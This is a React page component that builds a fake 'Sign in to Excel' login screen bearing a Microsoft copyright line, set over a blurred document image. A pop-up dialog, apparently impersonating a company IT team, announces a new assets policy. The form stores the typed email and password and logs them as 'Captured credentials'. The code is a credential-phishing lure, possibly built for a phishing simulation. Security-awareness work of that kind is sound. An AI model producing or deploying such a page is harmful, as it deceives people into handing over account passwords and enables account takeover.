'use client';
import { FormEvent, useState } from 'react';
import { AlertDialog, AlertDialogAction, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from '@/components/ui/alert-dialog';

export default function Home() {
  const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showDialog, setShowDialog] = useState(false);

  const handleSubmit = (event: FormEvent) => {
    event.preventDefault();
    console.log('Captured credentials:', { username, password });
    setShowDialog(true);
  };
  
  return (
    <>
      {/* Blurred Image */}
      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />

      <AlertDialog open={showDialog} onOpenChange={setShowDialog}>
        <AlertDialogContent 
          className="max-w-sm"
          style={{ 
            top: '2rem', 
            left: '50%',
            transform: 'translateX(-50%)', 
            position: 'fixed',
            backgroundColor: '#217346', 
            color: 'white', 
            borderColor: '#1b5c39' 
          }}>
          <AlertDialogHeader>
            <AlertDialogTitle>Trellissoft IT Team</AlertDialogTitle>
            <AlertDialogDescription style={{ color: '#e0e0e0' }}>
              New IT Assets Policy and Details .
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction 
              onClick={() => setShowDialog(false)}
              style={{ backgroundColor: 'white', color: '#217346' }}
              >
              Understood
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Login Overlay */}
      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
        
        <h2>Sign in to Excel</h2>
        <form onSubmit={handleSubmit}>
          <input 
            type="text" 
            name="username" 
            placeholder="Email or phone" 
            autoComplete="username" 
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required 
          />
          <input 
            type="password" 
            name="password" 
            placeholder="Password" 
            autoComplete="current-password" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required 
          />
          <button type="submit">Sign in</button>
          <small>© Microsoft Corporation</small>
        </form>
      </div>
    </>
  );
}
